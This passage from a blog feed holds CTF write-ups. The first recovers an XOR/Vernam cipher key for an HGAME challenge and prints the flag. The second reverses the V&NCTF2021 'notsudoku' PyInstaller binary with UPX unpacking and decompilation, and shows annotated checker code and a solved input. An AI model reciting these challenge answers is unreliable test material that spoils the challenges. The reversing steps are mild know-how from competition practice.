class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;\nLymmet y zn Art vs whe&lt; t&#123;e Elemznts o4 \nr pAintvng orrdrrwiNg b~lancereaph Othem \nout| T&#123;is\x00cousd be &amp;he3obJectl them!elees\x0c \nbjt it 1an3alSo rzlate &amp;o polOrs ~nd \no&amp;hea cOmpolition3l gecHniqjes.\nY=u ~ay\x00not?reali(e zt,\x00but?your 0razn *is &#125;usy w=rkzng\x00behvnd th7 spenEs tp seekr\noft Symmztry w:en3yoU lopk at 3 prinTing1 \nThe e rre\x00sevzral r7as|ns\x00for?this.rThv \nFirsk is t:at3we\x07re ward-w;rew tO lopk forr\nig. our ~ncien&amp; a&#125;ceStorl may &lt;ot3haVe h~d \na &lt;amv fOr ik, butrthvy Knew?that &amp;hezr *own?bodie! wvre\x00basvcallyrsy~meTric~l, asr\nwvre\x00thole of &quot;otvntIal oredat=rs3or\x00pref. \nTh7reuorE, twis ca?e zn Handf whet:er3\ncHoosvng a ?atv, Catcwing d;nnvr Or \n~voidi&lt;g qeiNg oq the ?enf oF a lnarli&lt;g,3\nhUngrf packrof3woLves?or be3rs2\nTAke ~ lookrat3yoUr f~ce inrthv mIrrom \nandrimrgiNe a?line !trrigHt dpwn th7 \n~idDle.?You\&#x27;l&gt; sve Both?sidesrof3yoUr \nyace a e creTty lymmet icrl.\x00Thil is \n9nodn As bvlater3l `ymMetrf and ;t\&#x27;` \nWherz bothrsiwes\x00eitwer si6e |f This?\ndivi6int lIne ~ppearrmoae Or lzss th7 srme\x0e\nSo?here ;s ghe\x00flax: \nhg3mehX0R_i52a_uS34U184nD$fUQny_C1&quot;H3a&#125;\n&#x27;</span></span><br><span class="line">ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3</span><br><span class="line">Python <span class="number">3.8</span><span class="number">.5</span> (default, Jul <span class="number">28</span> <span class="number">2020</span>, <span class="number">12</span>:<span class="number">59</span>:<span class="number">40</span>)</span><br><span class="line">[GCC <span class="number">9.3</span><span class="number">.0</span>] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">ord</span>(<span class="string">&#x27;x&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;o&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line"><span class="number">112</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">112</span>)</span><br><span class="line"><span class="string">&#x27;p&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 solve.py</span><br><span class="line"><span class="number">1069</span></span><br><span class="line"><span class="string">b&#x27;\nSymmet y zn Art is whe&lt; t&#123;e Elements o4 \nr pAinting orrdrrwiNg balancereaph Other \nout| T&#123;is\x00could be &amp;he3obJects them!elees\x0c \nbut it 1an3alSo relate &amp;o polOrs and \no&amp;hea cOmposition3l gecHniques.\nY=u ~ay\x00not reali(e zt,\x00but your 0razn *is busy w=rkzng\x00behind th7 spenEs to seekr\noft Symmetry w:en3yoU look at 3 prinTing. \nThe e rre\x00several r7as|ns\x00for this.rThv \nFirst is t:at3we\x07re hard-w;rew tO look forr\nig. our ancien&amp; a&#125;ceStors may &lt;ot3haVe had \na &lt;amv fOr it, butrthvy Knew that &amp;hezr *own bodie! wvre\x00basicallyrsy~meTrical, asr\nwvre\x00those of &quot;otvntIal predat=rs3or\x00prey. \nTh7reuorE, this ca?e zn Handy whet:er3\ncHoosing a ?atv, Catching d;nnvr Or \navoidi&lt;g qeiNg on the ?enf oF a snarli&lt;g,3\nhUngry packrof3woLves or be3rs2\nTAke a lookrat3yoUr face inrthv mIrror \nandrimrgiNe a line !trrigHt down th7 \n~idDle. You\&#x27;l&gt; sve Both sidesrof3yoUr \nface a e creTty symmet icrl.\x00This is \n9nodn As bilater3l `ymMetry and ;t\&#x27;` \nWhere bothrsiwes\x00either si6e |f This \ndivi6int lIne appearrmoae Or less th7 srme\x0e\nSo here ;s ghe\x00flag: \nhg3mehX0R_i5-a_uS34U184nD$fUNny_C1&quot;H3a&#125;\n&#x27;</span></span><br><span class="line">ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3</span><br><span class="line">Python <span class="number">3.8</span><span class="number">.5</span> (default, Jul <span class="number">28</span> <span class="number">2020</span>, <span class="number">12</span>:<span class="number">59</span>:<span class="number">40</span>)</span><br><span class="line">[GCC <span class="number">9.3</span><span class="number">.0</span>] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">ord</span>(<span class="string">&#x27;;&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line"><span class="number">51</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">51</span>)</span><br><span class="line"><span class="string">&#x27;3&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 solve.py</span><br><span class="line"><span class="number">1069</span></span><br><span class="line"><span class="string">b&quot;\nSymmetry zn Art is when t&#123;e Elements of \nr pAinting or drrwiNg balance eaph Other \nout. T&#123;is\x00could be the3obJects themselees\x0c \nbut it can3alSo relate to polOrs and \nothea cOmpositional gecHniques.\nYou ~ay\x00not realize zt,\x00but your brazn *is busy workzng\x00behind the spenEs to seek \noft Symmetry when3yoU look at a prinTing. \nThere rre\x00several reas|ns\x00for this. Thv \nFirst is that3we\x07re hard-wirew tO look for \nig. our ancient a&#125;ceStors may not3haVe had \na namv fOr it, but thvy Knew that thezr *own bodies wvre\x00basically sy~meTrical, as \nwvre\x00those of potvntIal predators3or\x00prey. \nThereuorE, this came zn Handy whether3\ncHoosing a matv, Catching dinnvr Or \navoiding qeiNg on the menf oF a snarling,3\nhUngry pack of3woLves or bears2\nTAke a look at3yoUr face in thv mIrror \nand imrgiNe a line strrigHt down the \n~idDle. You&#x27;ll sve Both sides of3yoUr \nface are creTty symmetricrl.\x00This is \nknodn As bilateral `ymMetry and it&#x27;` \nWhere both siwes\x00either side |f This \ndividint lIne appear moae Or less the srme\x0e\nSo here is ghe\x00flag: \nhgamehX0R_i5-a_uS3fU184nD$fUNny_C1pH3a&#125;\n&quot;</span></span><br><span class="line">ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3</span><br><span class="line">Python <span class="number">3.8</span><span class="number">.5</span> (default, Jul <span class="number">28</span> <span class="number">2020</span>, <span class="number">12</span>:<span class="number">59</span>:<span class="number">40</span>)</span><br><span class="line">[GCC <span class="number">9.3</span><span class="number">.0</span>] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">ord</span>(<span class="string">&#x27;x&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="number">88</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">88</span>)</span><br><span class="line"><span class="string">&#x27;X&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 solve.py</span><br><span class="line"><span class="number">1069</span></span><br><span class="line"><span class="string">b&quot;\nSymmetry zn art is when t&#123;e elements of \nr painting or drrwing balance eaph other \nout. T&#123;is could be the3objects themselees, \nbut it can3also relate to polors and \nothea compositional gechniques.\nYou ~ay not realize zt, but your brazn \nis busy workzng behind the spenes to seek \noft symmetry when3you look at a printing. \nThere rre several reas|ns for this. Thv \nfirst is that3we&#x27;re hard-wirew to look for \nig. Our ancient a&#125;cestors may not3have had \na namv for it, but thvy knew that thezr \nown bodies wvre basically sy~metrical, as \nwvre those of potvntial predators3or prey. \nThereuore, this came zn handy whether3\nchoosing a matv, catching dinnvr or \navoiding qeing on the menf of a snarling,3\nhungry pack of3wolves or bears2\nTake a look at3your face in thv mirror \nand imrgine a line strright down the \n~iddle. You&#x27;ll sve both sides of3your \nface are cretty symmetricrl. This is \nknodn as bilateral `ymmetry and it&#x27;` \nwhere both siwes either side |f this \ndividint line appear moae or less the srme.\nSo here is ghe flag: \nhgamehX0r_i5-a_uS3fU184nd$fUNny_C1pH3a&#125;\n&quot;</span></span><br><span class="line">ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3</span><br><span class="line">Python <span class="number">3.8</span><span class="number">.5</span> (default, Jul <span class="number">28</span> <span class="number">2020</span>, <span class="number">12</span>:<span class="number">59</span>:<span class="number">40</span>)</span><br><span class="line">[GCC <span class="number">9.3</span><span class="number">.0</span>] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>)</span><br><span class="line"><span class="number">80</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">80</span>)</span><br><span class="line"><span class="string">&#x27;P&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 solve.py</span><br><span class="line"><span class="number">1069</span></span><br><span class="line"><span class="string">b&quot;\nSymmetry in art is when the elements of \na painting or drawing balance each other \nout. This could be the objects themselves, \nbut it can also relate to colors and \nother compositional techniques.\nYou may not realize it, but your brain \nis busy working behind the scenes to seek \nout symmetry when you look at a painting. \nThere are several reasons for this. The \nfirst is that we&#x27;re hard-wired to look for \nit. Our ancient ancestors may not have had \na name for it, but they knew that their \nown bodies were basically symmetrical, as \nwere those of potential predators or prey. \nTherefore, this came in handy whether \nchoosing a mate, catching dinner or \navoiding being on the menu of a snarling, \nhungry pack of wolves or bears!\nTake a look at your face in the mirror \nand imagine a line straight down the \nmiddle. You&#x27;ll see both sides of your \nface are pretty symmetrical. This is \nknown as bilateral symmetry and it&#x27;s \nwhere both sides either side of this \ndividing line appear more or less the same.\nSo here is the flag: \nhgame&#123;X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r&#125;\n&quot;</span></span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>得到 flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;密码学实验正好做到弗纳姆密码，发现寒假时做到过，因此记录一下&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Crypto" scheme="https://s0uthwood.github.io/categories/CTF/Crypto/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Crypto" scheme="https://s0uthwood.github.io/tags/Crypto/"/>
    
    <category term="HGAME" scheme="https://s0uthwood.github.io/tags/HGAME/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;NCTF2021 re notsudoku</title>
    <link href="https://s0uthwood.github.io/2021/03/16/VNCTF2021-re-notsudoku/"/>
    <id>https://s0uthwood.github.io/2021/03/16/VNCTF2021-re-notsudoku/</id>
    <published>2021-03-16T14:15:03.000Z</published>
    <updated>2021-05-19T17:46:53.043Z</updated>
    
    <content type="html"><![CDATA[<p>V&amp;NCTF2021补题 第一篇</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>V&amp;NCTF直接白给了，全程耗在了Crackme2上，辛辛苦苦找到密文和算法后发现需要动态调试？过程中not sudoku这题就扫了一眼，结果还没发现是python逆向，于是就爬爬了。</p><p><del>感觉V&amp;N的题出得都好怪啊</del></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>好像是第一次做python exe的逆向</p><p>首先使用 <code>exeinfo</code> 差壳，发现有个 <code>UPX</code></p><p>用 <code>upx.exe -d</code> 脱壳</p><p>比赛的时候没想到这个是python逆向，直接拖到ida里面了，于是直接gg</p><p>再使用 <code>exeinfo</code> 查一下，会发现是 <code>pyinstaller</code> 编译的文件，说明是python逆向</p><p>上网下载一下 <code>pyinstxtractor.py</code> 进行反编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 pyinstxtractor.py notsudoku-noupx.exe</span></span><br></pre></td></tr></table></figure><p>进入文件夹，找没有后缀的文件，发现有一个叫做 <code>2</code> 的，使用 <code>010editor</code> 从 <code>struct</code> 文件复制文件头（第一行），然后添加 <code>.pyc</code> 后缀，进行 <code>pyc</code> 反编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> uncompyle6 -o 2.py 2.pyc</span></span><br></pre></td></tr></table></figure><p>即可得到 python 源码文件</p><p>发现文件里有一些日文，于是边阅读边修改就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.7 (3394)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.6.9 (default, Jan 26 2021, 15:33:00) </span></span><br><span class="line"><span class="comment"># [GCC 8.4.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: 2.py</span></span><br><span class="line"><span class="comment"># Compiled at: 1995-09-28 00:18:56</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 272 bytes</span></span><br><span class="line"><span class="keyword">import</span> time, sys, hashlib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class_a</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.dic = &#123;&#125;</span><br><span class="line">        self.list_a = []</span><br><span class="line">        self.inputflag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.list_b = []</span><br><span class="line">        self.<span class="built_in">int</span> = <span class="number">65</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> え(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> の(<span class="params">f</span>):</span></span><br><span class="line">            self.dic[other] = f</span><br><span class="line">            <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> の</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> お(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.dic.get(other)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            invoke = self.list_a[i][<span class="number">0</span>]</span><br><span class="line">            value = self.list_a[i][<span class="number">1</span>]</span><br><span class="line">            value_2 = self.list_a[i][<span class="number">2</span>]</span><br><span class="line">            func = self.お(invoke)</span><br><span class="line">            func(value, value_2)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">object_a = class_a()</span><br><span class="line"></span><br><span class="line"><span class="meta">@object_a.え(&#x27;add&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">1</span>:</span><br><span class="line">        object_a.list_b += b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@object_a.え(&#x27;string&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">1</span>:</span><br><span class="line">        print(object_a.inputflag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> a == <span class="number">2</span>:</span><br><span class="line">            print(object_a.list_b)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> a == <span class="number">3</span>:</span><br><span class="line">                print((object_a.flag), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(a, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@object_a.え(&#x27;exit&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@object_a.え(&#x27;input&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    object_a.inputflag = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@object_a.え(&#x27;sleep&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    time.sleep(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@object_a.え(&#x27;crypt&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(object_a.inputflag) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> object_a.inputflag:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(i) &gt; <span class="number">52</span> <span class="keyword">or</span> <span class="built_in">ord</span>(i) &lt; <span class="number">48</span>: <span class="comment"># input &gt; &#x27;0&#x27;, input &lt; &#x27;4&#x27;</span></span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line">    x = <span class="built_in">str</span>(hashlib.new(<span class="string">&#x27;md5&#x27;</span>, <span class="built_in">bytes</span>((object_a.inputflag), encoding=<span class="string">&#x27;utf8&#x27;</span>)).hexdigest())</span><br><span class="line">    <span class="keyword">if</span> x[:<span class="number">6</span>] != <span class="string">&#x27;e3a912&#x27;</span>: <span class="comment"># md5 start with &#x27;e3a912&#x27;</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    object_a.flag = x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@object_a.え(&#x27;initlist&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(object_a.inputflag), <span class="number">2</span>):</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        a = <span class="built_in">int</span>(object_a.inputflag[i])</span><br><span class="line">        b = <span class="built_in">int</span>(object_a.inputflag[(i + <span class="number">1</span>)])</span><br><span class="line">        object_a.list_b[a][b] = j <span class="comment"># 为list_b赋值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@object_a.え(&#x27;basiccheck&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> object_a.list_b[<span class="number">0</span>][<span class="number">1</span>] != <span class="number">24</span> <span class="keyword">or</span> object_a.list_b[<span class="number">4</span>][<span class="number">3</span>] != <span class="number">2</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">if</span> object_a.list_b[<span class="number">0</span>][<span class="number">2</span>] != <span class="number">1</span> <span class="keyword">or</span> object_a.list_b[<span class="number">2</span>][<span class="number">3</span>] != <span class="number">20</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">if</span> object_a.list_b[<span class="number">1</span>][<span class="number">0</span>] != <span class="number">23</span> <span class="keyword">or</span> object_a.list_b[<span class="number">3</span>][<span class="number">4</span>] != <span class="number">3</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line"><span class="comment"># 024334xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx23xxxx1001xx</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@object_a.え(&#x27;check&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="built_in">int</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="built_in">int</span> += object_a.list_b[a][i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span> != object_a.<span class="built_in">int</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            <span class="built_in">int</span> += object_a.list_b[i][b]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span> != object_a.<span class="built_in">int</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line"><span class="comment"># list_b 每行每列和为65</span></span><br><span class="line"><span class="comment"># 02433420112112034430403122130414004132233324100142</span></span><br><span class="line"></span><br><span class="line">object_a.list_a = [</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;welcome baby~ &#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;input your flag~:&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;input&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;your input is:&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;string&#x27;</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;string&#x27;</span>, <span class="string">&quot;let&#x27;s check......&quot;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;sleep&#x27;</span>, <span class="number">0.5</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;add&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;add&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;add&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;add&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span 